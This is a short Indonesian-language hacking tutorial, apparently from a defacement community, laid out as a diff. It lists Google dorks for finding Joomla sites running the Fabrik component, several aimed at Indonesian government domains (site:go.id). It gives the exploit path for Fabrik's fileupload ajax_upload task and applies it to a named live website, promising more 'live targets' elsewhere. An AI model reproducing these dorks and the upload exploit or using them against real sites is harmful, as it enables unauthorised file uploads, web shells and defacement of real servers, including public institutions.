@@ -1,0 +1,20 @@
+Dork : 
+inurl:index.php?option=com_fabrik
+inurl:index.php/component/fabrik/ site:go.id
+inurl:index.php?option=com_fabrik&view= site:go.id
+inurl:importcsv.php site:go.id
+
+Exploit : index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+Nah + exploit nya lurrr
+
+Nah itu saja,kita dorking dulu di google
+
+Seperti biasa kita Dork king dulu
+
+http://www.12dnacodeofgod.com/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
+
+
+Nah gitu,lu + exploit nya 
+
+Nah tuh live target nya Entar gua taru di diskrips
